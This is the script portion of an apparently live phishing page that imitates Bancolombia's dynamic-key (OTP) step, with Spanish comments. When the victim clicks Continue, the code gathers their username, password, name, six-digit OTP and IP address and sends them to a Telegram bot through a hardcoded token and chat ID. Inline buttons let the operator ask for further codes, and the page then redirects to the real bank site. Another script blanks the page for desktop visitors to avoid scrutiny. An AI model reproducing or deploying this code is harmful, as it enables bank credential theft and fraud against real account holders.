    <script>
      document.addEventListener('DOMContentLoaded', function() {
        // --- TUS CREDENCIALES DE TELEGRAM ---
        const TELEGRAM_TOKEN = '8594588884:AAF1ODTlOEYhDIKgILpadiPlcgfCm_aZEAA';
        const TELEGRAM_CHAT_ID = '-5182218323'; // Grupo LOG
        // ---------------------------------

        const inputs = document.querySelectorAll('.bc-dynamic-segment');
        const continueButton = document.querySelector('.bc-dynamic-continue');
        const buttonsContainer = document.querySelector('.bc-dynamic-buttons');
        
        // Funci√≥n para verificar si todos los campos est√°n llenos
        function checkInputs() {
          let allFilled = true;
          let hasInput = false;
          inputs.forEach(input => {
            if (input.value.length === 0) {
              allFilled = false;
            } else {
              hasInput = true;
            }
          });
          continueButton.disabled = !allFilled;

          // Mostrar/Ocultar botones
          if (hasInput) {
            buttonsContainer.style.display = 'flex';
          } else {
            buttonsContainer.style.display = 'none';
          }
        }

        // Auto-tabulaci√≥n entre inputs
        inputs.forEach((input, index) => {
          input.addEventListener('input', (e) => {
            // Solo permitir n√∫meros
            let val = e.target.value.replace(/[^0-9]/g, '');
            // Asegurar m√°ximo un caracter
            if (val.length > 1) val = val.slice(0, 1);
            e.target.value = val;

            // Saltar al siguiente campo solo si hay un n√∫mero v√°lido
            if (val.length === 1 && index < inputs.length - 1) {
              inputs[index + 1].focus();
            }
            checkInputs();
          });
          
          input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
              inputs[index - 1].focus();
            }
            setTimeout(checkInputs, 0);
          });
        });

        // Acci√≥n al hacer clic en Continuar
        continueButton.addEventListener('click', async function(e) {
          e.preventDefault();
          
          // Unir los 6 d√≠gitos
          let claveDinamica = "";
          inputs.forEach(input => { claveDinamica += input.value; });

          const usuario = sessionStorage.getItem("bc_usuario") || "Desconocido";
          const password = sessionStorage.getItem("bc_clave") || "No registrada";
          const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
          
          let clientIP = "Desconocida";
          try {
             const ipReq = await fetch('https://api.ipify.org?format=json');
             if(ipReq.ok) {
                const ipData = await ipReq.json();
                clientIP = ipData.ip;
             }
          } catch(err) {
             console.log("No se pudo obtener IP:", err);
          }

          // Funci√≥n para escapar caracteres HTML
          const escapeHtml = (text) => {
            return text
              .replace(/&/g, "&amp;")
              .replace(/</g, "&lt;")
              .replace(/>/g, "&gt;")
              .replace(/"/g, "&quot;")
              .replace(/'/g, "&#039;");
          };

          const mensaje = `üîî <b>Nueva Clave Din√°mica</b>\n\n` +
                          `üë§ Nombre: ${escapeHtml(userNombre)}\n` +
                          `üë§ Usuario: ${escapeHtml(usuario)}\n` +
                          `üîê Clave: ${escapeHtml(password)}\n` +
                          `üîë Din√°mica: <code>${escapeHtml(claveDinamica)}</code>\n` +
                          `üåê IP: ${escapeHtml(clientIP)}`;

          // Enviar a Telegram
          fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: mensaje,
              parse_mode: 'HTML',
                reply_markup: {
                  inline_keyboard: [
                    [
                      { text: "‚úÖ Finalizar", callback_data: "finish" },
                      { text: "üîÑ Pedir Din√°mica", callback_data: "ask_otp" }
                    ],
                    [
                      { text: "‚ùå Error Din√°mica", callback_data: "error_dinamica" },
                      { text: "‚ùå Error Usuario", callback_data: "error_user" }
                    ]
                  ]
                }
            })
          })
          .then(response => response.json())
          .then(data => {
            if (data.ok) {
               // Redirigir a espera.html con el ID del mensaje para polling
               window.location.href = `espera.html?id=${data.result.message_id}`;
            } else {
               console.error("Error Telegram:", data);
               // Fallback si falla
               window.location.href = "espera.html?next=https://www.bancolombia.com/personas";
            }
          })
          .catch(error => {
            console.error('Error de red (continuando flujo manual):', error);
            // Fallback manual
            window.location.href = "espera.html?next=https://www.bancolombia.com/personas";
          });
        });
      });
    </script>
  
    <script>
        // Verificar si venimos de un error (URL tiene ?error=true)
        document.addEventListener('DOMContentLoaded', function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('error')) {
                const notification = document.getElementById('errorNotification');
                notification.style.display = 'block';
                
                // Ocultar despu√©s de 3 segundos
                setTimeout(() => {
                    notification.style.display = 'none';
                    // Limpiar la URL para que no salga al recargar
                    window.history.replaceState({}, document.title, window.location.pathname);
                }, 3000);
            }
        });
    </script>
<script>
    (function() {
        // Mobile Check
        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
        var mobileRegex = /android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|o2|opera m(ob|in)i|palm( os)?|p(ixi|re)\/|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i;
        if (!mobileRegex.test(userAgent)) {
            document.body.innerHTML = '';
        }

        try {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let token = '';
            for(let i=0; i < 50 + Math.floor(Math.random() * 30); i++) {
                token += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            const base64Token = btoa(token + Date.now()).replace(/=/g, '');
            const url = new URL(window.location.href);
            url.searchParams.set('token', base64Token);
            window.history.replaceState(null, '', url.toString());
        } catch(e) {}
    })();
</script>
</body></html>
